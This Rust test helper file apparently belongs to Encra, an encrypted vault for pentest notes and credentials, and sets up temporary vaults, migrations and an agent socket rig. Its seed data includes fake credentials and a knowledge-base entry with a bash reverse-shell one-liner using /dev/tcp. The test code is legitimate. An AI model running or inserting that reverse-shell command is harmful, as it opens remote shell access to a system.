//! Shared test helpers: throwaway vault files, seeded data and the agent rig.

use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use base64::Engine;
use rusqlite::Connection;
use zeroize::Zeroize;
use crate::paths::*;
use crate::commands::lifecycle::*;
use crate::util::uuid_v4;
use crate::vault;
use crate::{activity, agent, backup, evidence, journal, kb};

pub(crate) fn migration_test_dir(label: &str) -> PathBuf {
    let path = std::env::temp_dir().join(format!("encra-{label}-{}", uuid_v4()));
    std::fs::create_dir_all(&path).unwrap();
    path
}

pub(crate) fn create_marker_database(path: &Path, marker: &str) {
    let db = Connection::open(path).unwrap();
    db.execute("CREATE TABLE migration_marker (value TEXT NOT NULL)", []).unwrap();
    db.execute("INSERT INTO migration_marker (value) VALUES (?1)", [marker]).unwrap();
}

pub(crate) fn read_marker_after_reopen(path: &Path) -> String {
    let db = Connection::open(path).unwrap();
    db.query_row("SELECT value FROM migration_marker", [], |row| row.get(0)).unwrap()
}

/// Lay out the real macOS shape: `<root>/<identifier>/<file>` per product.
pub(crate) fn app_data_root(label: &str) -> (PathBuf, PathBuf) {
    let root = migration_test_dir(label);
    let encra_dir = root.join("com.encra.desktop");
    (root, encra_dir)
}

/// A seeded, file-backed vault, reopened through a fresh connection so
/// every read below goes through what is actually on disk.
pub(crate) fn reopened_seeded_vault(label: &str) -> (PathBuf, Connection, [u8; 32]) {
    let dir = migration_test_dir(label);
    let path = dir.join(CURRENT_DATABASE_NAME);
    let dek = create_test_vault(&path, "credential-read-password");
    {
        let conn = Connection::open(&path).unwrap();
        seed_vault(&conn, &dek);
        // Format 2 data, brought to format 3 exactly as at unlock.
        bring_up_to_date(&conn, "credential-read-password", &dek).unwrap();
    }
    let conn = vault::init_db(&path).unwrap();
    (dir, conn, dek)
}

/// A file-backed database with the tables but no master password yet.
pub(crate) fn fresh_vault_file(label: &str) -> (PathBuf, PathBuf) {
    let dir = migration_test_dir(label);
    let path = dir.join(CURRENT_DATABASE_NAME);
    let conn = vault::init_db(&path).unwrap();
    activity::init_activity_table(&conn).unwrap();
    (dir, path)
}

pub(crate) fn activity_actions(conn: &Connection) -> Vec<String> {
    let mut stmt = conn.prepare("SELECT action FROM activity_log").unwrap();
    stmt.query_map([], |row| row.get(0)).unwrap().collect::<Result<_, _>>().unwrap()
}

pub(crate) const V2_PASSWORD: &str = "format-two-password";

/// A format-2 vault as an existing user has it: unbound values, plain
/// service names, default Argon2, and a log that names a login.
pub(crate) fn format_2_vault(label: &str) -> (PathBuf, PathBuf, [u8; 32]) {
    let dir = migration_test_dir(label);
    let path = dir.join(CURRENT_DATABASE_NAME);
    let dek = create_test_vault(&path, V2_PASSWORD);
    let conn = Connection::open(&path).unwrap();
    seed_vault(&conn, &dek);
    activity::log_action(&conn, "unlock", "vault unlocked");
    activity::log_action(&conn, "credential_add", "added github.com");
    activity::log_action(&conn, "lock", "vault locked");
    (dir, path, dek)
}

pub(crate) fn raw(conn: &Connection, sql: &str) -> String {
    conn.query_row(sql, [], |r| r.get(0)).unwrap()
}

pub(crate) struct AgentRig {
    pub(crate) dir: PathBuf,
    pub(crate) db: Arc<Mutex<Connection>>,
    pub(crate) dek: [u8; 32],
    pub(crate) hub: Arc<agent::server::Hub>,
    pub(crate) socket: PathBuf,
}

/// A format-3 vault, a hub logging into it, and a live socket.
pub(crate) fn agent_rig(label: &str, timeout: std::time::Duration) -> AgentRig {
    let (dir, path, dek) = format_2_vault(label);
    let conn = vault::init_db(&path).unwrap();
    bring_up_to_date(&conn, V2_PASSWORD, &dek).unwrap();
    agent::refs::init_alias_table(&conn).unwrap();
    let db = Arc::new(Mutex::new(conn));
    let log_db = Arc::clone(&db);
    let hub = agent::server::Hub::new(
        Box::new(|_, _| {}),
        Box::new(move |action, detail| {
            if let Ok(db) = log_db.lock() {
                activity::log_action(&db, action, detail);
            }
        }),
        timeout,
    );
    // Short folder name: macOS caps socket paths near 104 bytes.
    let socket_dir = PathBuf::from(format!("/private/tmp/encra-test-{}", &uuid_v4()[..8]));
    hub.start(&socket_dir).unwrap();
    let socket = agent::sock::socket_path(&socket_dir);
    AgentRig { dir, db, dek, hub, socket }
}

impl AgentRig {
    pub(crate) fn ask_in_background(&self, references: &[&str]) -> std::thread::JoinHandle<Result<agent::protocol::Response, String>> {
        let socket = self.socket.clone();
        let request = agent::protocol::Request {
            agent: "test-agent".into(),
            argv: vec!["/usr/bin/env".into()],
            executable: "/usr/bin/env".into(),
            cwd: "/private/tmp".into(),
            references: references.iter().map(|r| r.to_string()).collect(),
        };
        std::thread::spawn(move || agent::client::ask(&socket, &request))
    }

    pub(crate) fn wait_for_pending(&self) -> agent::server::PendingInfo {
        // Generous: both ends hash the (50 MB, debug) test binary to check
        // each other, which is slow while Argon2 tests run alongside.
        for _ in 0..3000 {
            if let Some(info) = self.hub.pending().into_iter().next() {
                return info;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        panic!("no request arrived");
    }

    pub(crate) fn actions(&self) -> Vec<String> {
        activity_actions(&self.db.lock().unwrap())
    }

    pub(crate) fn finish(self) {
        let socket_dir = self.socket.parent().unwrap().to_path_buf();
        self.hub.stop();
        drop(self.hub);
        std::fs::remove_dir_all(socket_dir).unwrap();
        std::fs::remove_dir_all(self.dir).unwrap();
    }
}

pub(crate) fn approved_value(response: agent::protocol::Response, reference: &str) -> String {
    match response {
        agent::protocol::Response::Approved(values) => {
            let (_, value) = values.iter().find(|(r, _)| r == reference).expect("value for the reference");
            String::from_utf8(value.to_vec()).unwrap()
        }
        other => panic!("expected approval, got {other:?}"),
    }
}

/// Responses carry Zeroizing buffers and are not Clone; rebuild one for reading.
pub(crate) fn client_clone(response: &agent::protocol::Response) -> agent::protocol::Response {
    match response {
        agent::protocol::Response::Approved(values) => agent::protocol::Response::Approved(
            values.iter().map(|(r, v)| (r.clone(), zeroize::Zeroizing::new(v.to_vec()))).collect(),
        ),
        agent::protocol::Response::Denied => agent::protocol::Response::Denied,
        agent::protocol::Response::Error(m) => agent::protocol::Response::Error(m.clone()),
    }
}

/// Create a vault with the standard schema and a known, freshly wrapped DEK.
pub(crate) fn create_test_vault(path: &Path, password: &str) -> [u8; 32] {
    let conn = vault::init_db(path).unwrap();
    journal::init_journal_tables(&conn).unwrap();
    kb::init_kb_tables(&conn).unwrap();
    activity::init_activity_table(&conn).unwrap();
    evidence::init_tables(&conn).unwrap();
    conn.execute_batch("PRAGMA foreign_keys = ON;").unwrap();

    let dek = vault::generate_dek();
    let mut salt = [0u8; 32];
    crate::util::fill_random(&mut salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(salt);
    let mut wrapping_key = vault::derive_key(password, &salt).unwrap();
    let wrapped = vault::wrap_dek(&dek, &wrapping_key).unwrap();
    wrapping_key.zeroize();
    let pass_hash = vault::hash_password(password).unwrap();
    conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped]).unwrap();
    conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).unwrap();
    conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).unwrap();
    conn.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).unwrap();
    dek
}

/// Seed one fully populated credential plus a project, entry and KB row.
pub(crate) fn seed_vault(conn: &Connection, dek: &[u8; 32]) {
    let enc = |v: &str| vault::encrypt(dek, v).unwrap();
    conn.execute(
        "INSERT INTO credentials (id, service, username, password_encrypted, url, notes, totp_secret) VALUES (?1,?2,?3,?4,?5,?6,?7)",
        rusqlite::params!["c1", "github.com", enc("dev@example.com"), enc("gh_p@$$w0rd"), enc("https://github.com"), enc("personal account"), enc("JBSWY3DPEHPK3PXP")],
    ).unwrap();
    conn.execute(
        "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1,?2,?3,?4,?5,?6)",
        rusqlite::params!["c2", "aws", enc("root@corp.io"), enc("short12chars"), enc("https://aws.amazon.com"), enc("prod")],
    ).unwrap();
    conn.execute(
        "INSERT INTO projects (id, name, description, target, methodology) VALUES (?1,?2,?3,?4,?5)",
        rusqlite::params!["p1", "Home Lab", enc("passive recon"), enc("192.168.1.0/24"), enc("OSSTMM")],
    ).unwrap();
    conn.execute(
        "INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1,?2,?3,?4,?5,?6)",
        rusqlite::params!["e1", "p1", enc("found open port"), enc("port 22 open"), "recon", "medium"],
    ).unwrap();
    conn.execute(
        "INSERT INTO kb_entries (id, title, command, description, tags, category) VALUES (?1,?2,?3,?4,?5,?6)",
        rusqlite::params!["k1", enc("reverse shell"), enc("bash -i >& /dev/tcp/host/4444 0>&1"), enc("standard shell"), enc("shell,bash"), "exploitation"],
    ).unwrap();
}

pub(crate) fn legacy_v1_backup(source_dek: &[u8; 32]) -> backup::VaultBackup {
    backup::VaultBackup {
        version: "1.0".into(),
        credentials: vec![backup::BackupCredential {
            service: "github.com".into(),
            // A v1.0 export left these as the source vault's ciphertext.
            username: vault::encrypt(source_dek, "dev@example.com").unwrap(),
            password: "plaintext-password".into(),
            url: vault::encrypt(source_dek, "https://github.com").unwrap(),
            notes: vault::encrypt(source_dek, "note").unwrap(),
            totp_secret: None,
            created_at: "2026-01-01".into(),
        }],
        projects: vec![],
        journal_entries: vec![],
        kb_entries: vec![],
        evidence: vec![],
    }
}

pub(crate) fn sha256_hash(input: &str) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    format!("{:x}", hasher.finalize())
}
